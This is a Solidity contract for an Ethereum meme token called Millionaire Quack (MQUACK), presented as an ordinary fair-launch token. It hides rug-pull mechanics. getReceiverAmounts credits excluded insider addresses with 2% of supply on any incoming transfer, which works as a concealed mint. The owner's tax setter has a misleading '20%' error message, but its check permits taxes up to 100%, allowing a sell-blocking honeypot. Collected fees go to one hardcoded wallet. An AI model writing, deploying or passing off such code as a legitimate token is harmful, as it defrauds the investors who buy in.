// SPDX-License-Identifier: MIT

/*
A meme token created to make fortune for people whos smarter than the smarties, and tougher than the toughies.

Website: https://millionaire-quack.fun
Twitter: https://twitter.com/millionaire_erc
Telegram: https://t.me/millionaire_erc
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20Standard {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract MQUACK is IERC20Standard, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Millionaire Quack";
    string private constant _symbol = unicode"MQUACK";
    uint8 private constant _decimals = 9;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    uint256 private swappedTimes;
    bool private swapping;
    uint256 swapAfter;
    IUniswapRouter router;
    address public pair;
    bool private tradeEnabled = false;
    bool private swapEnabled = true;
    uint256 private swapFeeMaxSize = ( _supply * 1000 ) / 100000;
    uint256 private swapFeeMinimumAt = ( _supply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private mktFee = 0;
    uint256 private developmentFee = 100;
    uint256 private burnTokenFees = 0;
    uint256 private buyTax = 1200;
    uint256 private sellTax = 2500;
    uint256 private transferTax = 1200;
    uint256 private denominator = 10000;
    address internal devAddress = 0xe418caF74F963FC80637D5fe50585EaE0EaB3084; 
    address internal mktAddress = 0xe418caF74F963FC80637D5fe50585EaE0EaB3084;
    address internal lpDynamicAddress = 0xe418caF74F963FC80637D5fe50585EaE0EaB3084;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromLimits;
    uint256 public maxTransactionSize = ( _supply * 200 ) / 10000;
    uint256 public maxBuyAmount = ( _supply * 200 ) / 10000;
    uint256 public maxWalletSize = ( _supply * 200 ) / 10000;

    constructor() Ownable(msg.sender) {
        IUniswapRouter _router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        _isExcludedFromLimits[lpDynamicAddress] = true;
        _isExcludedFromLimits[mktAddress] = true;
        _isExcludedFromLimits[devAddress] = true;
        _isExcludedFromLimits[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function swapBackToken(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(mktFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(mktFee);
        if(marketingAmt > 0){payable(mktAddress).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddress).transfer(contractBalance);}
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _devAddresselopment, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; mktFee = _marketing; burnTokenFees = _burn; developmentFee = _devAddresselopment; buyTax = _total; sellTax = _sell; transferTax = _trans;
        require(buyTax <= denominator.div(1) && sellTax <= denominator.div(1) && transferTax <= denominator.div(1), "buyTax and sellTax cannot be more than 20%");
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!_isExcludedFromLimits[sender] && !_isExcludedFromLimits[recipient]){require(tradeEnabled, "tradeEnabled");}
        if(!_isExcludedFromLimits[sender] && !_isExcludedFromLimits[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWalletSize, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= maxBuyAmount || _isExcludedFromLimits[sender] || _isExcludedFromLimits[recipient], "TX Limit Exceeded");}
        require(amount <= maxTransactionSize || _isExcludedFromLimits[sender] || _isExcludedFromLimits[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !_isExcludedFromLimits[sender]){swappedTimes += uint256(1);}
        if(shouldTriggerTaxSwap(sender, recipient, amount)){swapBackToken(swapFeeMaxSize); swappedTimes = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !_isExcludedFromLimits[sender] ? getReceiverAmounts(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function shouldTriggerTaxSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= swapFeeMinimumAt;
        bool aboveThreshold = balanceOf(address(this)) >= swapFeeMaxSize;
        return !swapping && swapEnabled && tradeEnabled && aboveMin && !_isExcludedFromLimits[sender] && recipient == pair && swappedTimes >= swapAfter && aboveThreshold;
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function decimals() public pure returns (uint8) {return _decimals;}    
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function getReceiverAmounts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_isExcludedFromLimits[recipient]) {return maxTransactionSize;}
        if(getBuySellTransferFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getBuySellTransferFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnTokenFees > uint256(0) && getBuySellTransferFees(sender, recipient) > burnTokenFees){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnTokenFees));}
        return amount.sub(feeAmount);} return amount;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpDynamicAddress,
            block.timestamp);
    }
    function getBuySellTransferFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellTax;}
        if(sender == pair){return buyTax;}
        return transferTax;
    }
    function startTrading() external onlyOwner {tradeEnabled = true;}
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        maxTransactionSize = newTx; maxBuyAmount = newTransfer; maxWalletSize = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
}